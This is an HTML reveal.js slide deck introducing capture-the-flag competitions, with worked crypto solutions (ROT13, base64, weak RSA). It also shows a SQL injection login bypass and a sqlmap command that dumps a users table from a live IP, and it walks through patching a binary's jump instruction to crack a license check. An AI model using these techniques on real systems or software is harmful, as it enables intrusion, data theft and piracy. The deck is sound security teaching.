<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

    <title>My Slides</title>
    <link rel="shortcut icon" href="./favicon.ico" />
    <link rel="stylesheet" href="./dist/reset.css" />
    <link rel="stylesheet" href="./dist/reveal.css" />
    <link rel="stylesheet" href="./dist/theme/black.css" id="theme" />
    <link rel="stylesheet" href="./css/highlight/base16/zenburn.css" />

  </head>
  <body>
    <div class="reveal">
      <div class="slides">
        <section data-markdown data-separator="^---$" data-separator-vertical="^--$">
          <textarea data-template>
            

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/monokai-sublime.min.css">

<link rel="icon" href="./favicon.ico" type="image/x-icon">

# Intro to CTFs

#### + other things you should know

---

## CTF

- Capture The Flag
- Special kind of information security
- You will apply your cybersecurity skills to solve a challenge and get the flag.

--

### Flag

- A secret string
- Can be found only when you successfully solve the challenge
- Thus, submitted as a proof of completion
- Usually of a format like `Curiosity{.*}`
  - `Curiosity{f0und_7h3_fl4g}`

---

## Variants

- Jeopardy
- Attack-Defence
- KOTH
- Hardware

--

### Jeopardy

- Challenges from various categories
- Most famous
- Find the flag and submit it for points
- Dynamic scoring
  - -> more solves, less points
- Extra points for the first solve - `First Blood`

--

### Attack-Defence

- Each team will be given a vulnerable service
- Teams will defend their own service and patch it up
- Simultaneously, attack the other teams' services and develop exploits
- DEFCON and NYU-CSAW Finals

--

### KOTH

- You and other players connect to a **shared vulnerable machine (target)**.
- Everyone tries to **gain root (admin) access**.
- Replace or defend a **flag file**, e.g. `/root/king.txt`.
- The goal is to **“hold the hill”** (keep control) for as long as possible.
- You earn points **for every minute/second** you remain in control of the flag.

--

### Hardware

Hardware CTF is a CTF style where the challenges involve real physical devices.

In short: “pwning or analyzing physical devices to capture flags.”

- Example: camera, drone, microphone ...

---

## Categories

- Binary Exploitation (holy pwn XD)
- Reverse Engineering
- Web Exploitation
- Cryptography
- Steganography
- Digital Forensics
- OSINT
- Programming

---

<img src="https://media.makeameme.org/created/enough-talk-show.jpg" width="1000px" alt="demo sparta"/>

---

### Cryptography

- Cryptic message with a hint in the challenge description or title
- Deeper concepts require a good knowledge of mathematics
- Rotation ciphers are a starting point

--

### ROT13

- Encryption by shifting each character by 13 places to the right
- Most popular - **ROT13** aka Caesar Cipher

--
![valid example](assets/intro-to-ctfs/crypto/4.png)

--

### Challenge #1

**Encrypted message:**

`Phevbfvgl{ebg13_penpx3q_fhpp3ffsh11l}`

**Encryption Method:**

`ROT13`

Decrypt the message

--

### HINT 1 : google online websites to decrypt ROT13

--

### Solution

https://cryptii.com/pipes/rot13-decoder

![valid example](assets/intro-to-ctfs/crypto/1.png)

--

### FLAG :))))))

```
Curiosity{rot13_crack3d_succ3ssfu11y}
```

--

### Challenge #2

**Encrypted message:**

`Q3VyaW9zaXR5e3RoMXNfaTVfNF9iYXNlNjRfc3RyMW5nfQ==`

**Encryption Method:**

`NOT PROVIDED :))))))) YOUR ON YOUR OWN FOR THIS ONE ....`

Decrypt the message

--

### HINT 2 : dcode website can guess your cipher.

https://www.dcode.fr/cipher-identifier

--

### Solution

- step 1 : Identifier the cipher (cipher = encryption algorithm).

https://www.dcode.fr/cipher-identifier

![valid example](assets/intro-to-ctfs/crypto/2.png)

--

- step 2 : decrypt the ciphertext to get the flag.

https://gchq.github.io/CyberChef/

![valid example](assets/intro-to-ctfs/crypto/3.png)

--

### FLAG

```
Curiosity{th1s_i5_4_base64_str1ng}
```

--

### Challenge #3

<pre><code class="language-python" data-line-numbers="1|2-6|8-9|11|">#!/usr/bin/env python3 
def custom_encryption(s: str) -> str:
    lst = list(s)
    for i in range(0, len(lst) - 1, 2):
        lst[i], lst[i+1] = lst[i+1], lst[i]
    return "".join(lst)

# This is the ciphertext
ciphertext = "uCirsoti{yht5ii__s_4uctsm0s_uhffelc_p1eh}r"

print("Ciphertext:", ciphertext)
</code></pre>

--

### HINT 3 : All you have to do is writing a decryption function

--

### Solution

<pre><code class="language-python" data-line-numbers="1|2-6|8-9|11-14|16|">#!/usr/bin/env python3 
def custom_encryption(s: str) -> str:
    lst = list(s)
    for i in range(0, len(lst) - 1, 2):
        lst[i], lst[i+1] = lst[i+1], lst[i]
    return "".join(lst)

def custom_decryption(s: str) -> str:
    return custom_encryption(s)

# This is the ciphertext
ciphertext = "uCirsoti{yht5ii__s_4uctsm0s_uhffelc_p1eh}r"
FLAG = custom_decryption(ciphertext)
print("Ciphertext:", ciphertext)

print("FLAG:", FLAG)
</code></pre>

--

![valid example](assets/intro-to-ctfs/crypto/6.png)

--

### FLAG

```
Curiosity{thi5_is_4_cust0m_shuffle_c1pher}
```

--

### Challenge #4

- My friend **`saif sebai`** sniffed some stuff on the dark web.
- Can you help him make a meaning.

```
N = 18919224834143456431138297509941203833538711268086617507582307027078320060730084168055807297259756134810081795820117047565519725225746431453190236115649174
e = 65537
Ciphertext = 16352260156356007648150430355580760925941907468433953973472759717469280555151823724727980096107806776714873348983354843165807595856628129146732561481440035
```

--

### HINT 4 : Wikipedia might be a good place to understand RSA cipher

https://en.wikipedia.org/wiki/RSA_cryptosystem

### Or YOUR ARE LUCKY I POSTED ABOUT THISSSSSS :)))))

https://mensi-mohamed-amine.github.io/posts/rsa/

--

### Solver :

<pre><code class="language-python" data-line-numbers="1|3|5-11|13-14|16-22|24-26|28-31|33-41|">#!/usr/bin/env python3 

from sympy import factorint, mod_inverse

# Given values
N = 18919224834143456431138297509941203833538711268086617507582307027078320060730084168055807297259756134810081795820117047565519725225746431453190236115649174
print(f"N: {N}")
e = 65537
print(f"e: {e}")
c = 16352260156356007648150430355580760925941907468433953973472759717469280555151823724727980096107806776714873348983354843165807595856628129146732561481440035
print(f"c: {c}")

# Factor N (SymPy will return a dict {prime: exponent})
factors = factorint(N)

# Convert factor dict to a list of primes repeated by exponent
primes = []
for p, exp in factors.items():
    primes.extend([p] * exp)

if len(primes) != 2:
    raise SystemExit("N is not a product of exactly two primes (or SymPy didn't find it that way).")

p, q = primes
print("p =", p)
print("q =", q)

# Compute private exponent
phi = (p - 1) * (q - 1)
d = mod_inverse(e, phi)
print("d =", d)

# Decrypt
m = pow(c, d, N)
# Convert integer to bytes and decode
mb = m.to_bytes((m.bit_length() + 7) // 8, 'big')
try:
    plaintext = mb.decode()
except UnicodeDecodeError:
    plaintext = mb
print("FLAG:", plaintext)

</code></pre>

--

### Solver output

![valid example](assets/intro-to-ctfs/crypto/5.png)

--

### FLAG

```
Curiosity{abs0lu43_b34st_y0u_crack3d_rsa}
```

---

### Web Exploitation

- Deals with web applications
- Identify flaws in the working of the web app
  - how it processes user input
  - programming flaw
- Knowledge of web development will be helpful
  - at least, you require the ability to read and understand JS and PHP code
- [OWASP Top10](https://owasp.org/www-project-top-ten/)

--

<img src="https://media.makeameme.org/created/its-demo-time-bf0e1881d0.jpg" width="1000px" alt="demo time"/>

--

### Demo #1

- We have a login/register website.
- The flag is in the database of the website.

--

- http://51.77.151.20:2789/

![valid example](assets/intro-to-ctfs/web/2.png)

--

- Backend query.

```SQL
SELECT username FROM users WHERE username = '${username}' AND password = '${password}'
```

--

- Normal behaviour :

```SQL
SELECT username FROM users WHERE username = 'mohamed' AND password = 'mohamed2025'
```

![valid example](assets/intro-to-ctfs/web/1.png)

--

- Malicious input :

```SQL
SELECT username FROM users WHERE username = '' OR 1=1 --' AND password = 'alsdkhflkajshdflkjahdsf'
```

![valid example](assets/intro-to-ctfs/web/3.png)

--

- We logged in :))))))))))

![valid example](assets/intro-to-ctfs/web/4.png)

--

- Now after confirming that the website is vulnerable we will go-on for advanced sql-injection vulnerability exploitation
  using `sqlmap`.

--

- We will use the following sqlmap command to attack the website.

```bash
sqlmap --flush-session -u "http://51.77.151.20:2789/login" --data="username=alice&password=wonderland" -T users --dump --batch --threads 10
```

![valid example](assets/intro-to-ctfs/web/5.png)

--

- And we got our flag :))))))

![valid example](assets/intro-to-ctfs/web/6.png)

--

<img src="https://media.makeameme.org/created/its-all-over-tavdc2.jpg" width="500px" alt="demo time"/>

--

### Mitigations

- Store hashed password not plaintext
- Input sanitization & Input validation (reject invalid/malicious data like sql queries)
- ...

--

# Q & A

---

### Reverse Engineering

- In simple terms Reverse Engineering refers to the process of deconstructing any engineered object to figure out the internal mechanisms.

- Reverse Engineering in a CTF is typically the process of taking a compiled program ( like apk, exe, elf ) and converting it back into a more human readable format.

- The goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues.

--

<img src="https://media.makeameme.org/created/demo-time-finally.jpg" width="500px" alt="demo time"/>

--

### Demo #1

- We have a proprietary software.
- crack its license.

--

- I entered a license, the program shows that my license is not valid.

![valid example](assets/intro-to-ctfs/re/1.png)

--

- First thing i did was opening the program inside `x32dbg`

![valid example](assets/intro-to-ctfs/re/2.png)

--

- Then i looked for string references.

![valid example](assets/intro-to-ctfs/re/3.png)

--

- I looked for the string which is dumped when our license is wrong in the code.
- `Nope, thats not it!\n\rTry again`

![valid example](assets/intro-to-ctfs/re/4.png)

--

- We found the comparing code snippet.

![valid example](assets/intro-to-ctfs/re/5.png)

--

- Now we will patch the jne instruction that is dependent on the comparison to always jump to "correct-license" code snippet.

![valid example](assets/intro-to-ctfs/re/6.png)

--

- Patched :))))))))

![valid example](assets/intro-to-ctfs/re/7.png)

--

- Save our patched program (CTRL + P)

![valid example](assets/intro-to-ctfs/re/8.png)

--

- let's now test our patched program.
- Even though we entered random data we passed the license check.

![valid example](assets/intro-to-ctfs/re/9.png)

--

<img src="https://media.makeameme.org/created/its-over-clap.jpg" width="500px" alt="demo time"/>

--

### Mitigations

- Code obfuscation & anti-tamper
- Sign binaries and enforce signature checks at install/run time;

--

# Q & A

---

### Forensics

- Forensics is the art of recovering the digital trail left on a computer. There are plently of methods to find data which is seemingly deleted, not stored, or worse, covertly recorded.

- In a CTF context, "Forensics" challenges can include file format analysis, steganography, memory dump analysis, or network packet capture analysis.

--

- Any challenge to examine and process a hidden piece of information out of static data files (as opposed to executable programs or remote servers) could be considered a Forensics challenge

--

### Challenge #1

We are given an image, and it might contain certain hidden information

![assets/intro-to-ctfs/forensics/exiftool.png](assets/intro-to-ctfs/forensics/Dee_Dee.jpeg)

--

### HINT 1 : use exiftool (a linux tool to dump a picture metadata)

--

### Writeup

[Dee Dee](https://mensi-mohamed-amine.github.io/posts/securinets-ensit-beginner-ctf/#dee-deedigital-forensics)

---

### OSINT

- Open Source INTelligence
  - Anything that is available to everybody in the internet
- If you know how to search smartly, the challenge is already over
- Google Dorks is your excalibur

--

### Challenge #1

- COMMITMENT
- Find the flag :))))
- Description: I lost my PDFs files, can you help me find them.

--

### HINT 1 : WHAT DOES THE TASK NAME MEAN.

--

### Writeup

[COMMITMENT](https://mensi-mohamed-amine.github.io/posts/securinets-ensit-beginner-ctf/#commitmentosint)

---

# RANDOM ADVICES :))))

---

## Practice sites

- [TryHackMe](https://tryhackme.com)
- [VulnHub](https://www.vulnhub.com/)
- [HackTheBox](https://hackthebox.eu)

---

### ctftime.org !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

- The goal is to engage not just play CTFs.
- Use [ctftime.org](https://ctftime.org) to track CTFs and your team’s performance
- CTF calendar
- World-wide and country-wide team ratings
- Writeups

(in that order)

---

## Writeups and reports

- Make sure to record your approaches
- Will definitely benefit you in long pentests and challenges where you will have to connect multiple services and systems to exploit the system
- Helpful to others too

---

- Theory is suckkss (ye33333) but its important !!!!!!!
- let's get out hand dirty with reversing ......

<img src="https://media.licdn.com/dms/image/v2/D4D22AQEo1jsSFa12YA/feedshare-shrink_800/feedshare-shrink_800/0/1727582462114?e=2147483647&v=beta&t=EIz2OyTwJxw8i4UHIZlbPOXn0y3HS9vFTRg4lYUWT88" width="500px" alt="demo time"/>

---

# ...

          </textarea>
        </section>
      </div>
    </div>

    <script src="./dist/reveal.js"></script>

    <script src="./mermaid/dist/mermaid.min.js"></script>

    <script src="./plugin/markdown/markdown.js"></script>
    <script src="./plugin/highlight/highlight.js"></script>
    <script src="./plugin/zoom/zoom.js"></script>
    <script src="./plugin/notes/notes.js"></script>
    <script src="./plugin/math/math.js"></script>
    <script>
      function extend() {
        var target = {};
        for (var i = 0; i < arguments.length; i++) {
          var source = arguments[i];
          for (var key in source) {
            if (source.hasOwnProperty(key)) {
              target[key] = source[key];
            }
          }
        }
        return target;
      }

      // default options to init reveal.js
      var defaultOptions = {
        controls: true,
        progress: true,
        history: true,
        center: true,
        transition: 'default', // none/fade/slide/convex/concave/zoom
        slideNumber: true,
        highlight: {
          highlightOnLoad: false
        },
        plugins: [
          RevealMarkdown,
          RevealHighlight,
          RevealZoom,
          RevealNotes,
          RevealMath
        ]
      };

      // options from URL query string
      var queryOptions = Reveal().getQueryHash() || {};

      var options = extend(defaultOptions, {"transition":"slide","controls":true,"progress":true,"history":false,"slideNumber":false,"_":["slides"],"static":"docs"}, queryOptions);
    </script>


    <script>
      Reveal.initialize(options);
      Reveal.addEventListener('ready', function (event) {
        const blocks = Reveal.getRevealElement().querySelectorAll('pre code:not(.mermaid)');
        const hlp = Reveal.getPlugin('highlight');
        blocks.forEach(hlp.highlightBlock);
      });
    </script>

    <script>
      const mermaidOptions = extend({ startOnLoad: false }, {});
      mermaid.startOnLoad = false;
      mermaid.initialize(mermaidOptions);
      const cb = function (event) {
        mermaid.init(mermaidOptions, '.stack.present > .present pre code.mermaid');
        mermaid.init(mermaidOptions, '.slides > .present:not(.stack) pre code.mermaid');
      }
      Reveal.addEventListener('ready', cb);
      Reveal.addEventListener('slidetransitionend', cb);
    </script>
  </body>
</html>
